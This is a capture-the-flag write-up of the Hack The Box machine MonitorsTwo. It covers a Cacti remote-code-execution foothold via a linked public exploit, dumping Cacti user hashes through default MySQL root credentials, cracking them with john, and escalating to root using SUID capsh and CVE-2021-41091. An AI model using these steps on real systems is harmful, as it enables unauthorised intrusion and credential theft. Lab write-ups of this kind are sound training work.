---
title: HTB MonitorsTwo
author: hanhctf
date: 2023-05-04 17:22:22 +0700
categories: [Write-up, HTB]
tags: [docker]
toc: true
mermaid: true
---

# [**MonitorsTwo**](https://www.hackthebox.com/achievement/machine/108910/539)

## NMAP

```shell
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Have 2 ports(`22`, `80`) are open.

## Web enumeration

With `Dirsearch`, i found some link but nothing interested.

Search vulnarability for `Cacti` on [exploit-db](https://www.exploit-db.com/exploits/51166)  
Found a RCE exploit with Cacti v1.2.22 that website is running.  

After edit `local_cacti_ip = 127.0.0.1` script run well. And got shell.  
![](/commons/HTB/MonitorsTwo/1_shell.png)

## Foothold

Upload `linpeas.sh` and find a vector to exploit.  
First of all, we are in docker container.
![](/commons/HTB/MonitorsTwo/2_docker_env.png)

Found some interesting points.

```shell
╔══════════╣ Possible Entrypoints
-rw-r--r-- 1 root     root      648 Jan  5 11:37 /entrypoint.sh

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 1126 Feb 18  2022 /etc/mysql/mariadb.cnf

═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
-rwsr-xr-x 1 root root 55K Jan 20  2022 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 35K Jan 20  2022 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash
-rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
```

### Privilege escalation www-data to root in docker

1. Read file `/entrypoint.sh`

```shell
cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"

```

We can run mysql with defaul creds `mysql --host=db --user=root --password=root cacti -e "show tables"`

```shell
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
1       admin   $2y$10$IhEA.[REACTED]    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       1       1       on      -1      -1  -1               0       0       663348655
3       guest   [REACTED]        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              0       0       0
4       marcus  [REACTED]    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       1       1       on      -1      -1  on       0       0       2135691668
```

we get 3 creds

```
admin   [REACTED]
guest   [REACTED]
marcus  [REACTED]
```

Crack hash with `john` we found creds of `marcus:[REACTED]`

Use this creds for `SSH` connection.

## Privilege Escalation

Continous use `linpeas.sh` to find a vector priv.  
After focus on output of linpeas.
we can see mail of `/var/mail/marcus` that include some interesting detail.

Have 3 CVEs on system

- CVE-2021-33033 ---> ???
- CVE-2020-25706 ---> can not exploit.
- CVE-2021-41091 ---> can exploit with public poc <https://github.com/UncleJ4ck/CVE-2021-41091>

Put `exp.sh` file to victim machine.
Run script but can not find `./bin/bash` have a suid.

Go back docker enviroment.
Check GUID and find [capsh](https://gtfobins.github.io/gtfobins/capsh)
We add SUID to `bin/bash`

```shell
find / -type f -perm /4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
www-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
chmod u+s /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Now go back to marcus shell.
GOT ROOT :)))
